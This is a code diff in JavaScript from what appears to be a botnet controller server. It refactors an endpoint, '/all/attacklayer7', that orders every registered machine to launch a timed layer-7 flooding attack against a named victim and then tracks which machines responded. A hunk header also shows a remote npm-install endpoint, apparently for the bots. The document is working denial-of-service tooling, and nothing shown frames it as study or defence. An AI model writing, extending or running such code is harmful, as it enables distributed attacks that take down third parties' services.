@@ -119,6 +119,13 @@ let Machines = {
     },
     count: function() {
         return (Object.keys(Machines.all)).length
+    },
+    list: function() {
+        let macar = []
+        for (const key in Machines.all) {
+            macar.push(Machines.all[key])
+        }
+        return macar
     }
 }
 
@@ -528,21 +535,21 @@ app.get('/all/npminstall/:module', (req, res) => {
 
 app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
     let machines = {
-        all: activeMachinesList,
+        all: Machines.list(),
         asked: [],
         responded: [],
         busy: []
     }
-    for (let index = 0; index < Machines.count(); index++) {
-        machines.asked.push(activeMachinesList[index])
-        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+    for (let index = 0; index < (machines.all).length; index++) {
+        machines.asked.push((machines.all)[index])
+        axios.get(`http://${(machines.all)[index]}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
-                machines.responded.push(activeMachinesList[index])
+                machines.responded.push((machines.all)[index])
             })
             .catch(err => {
                 console.error(err.response.data);
-                machines.busy.push(activeMachinesList[index])
+                machines.busy.push((machines.all)[index])
             })
     }
     await delay(3000)
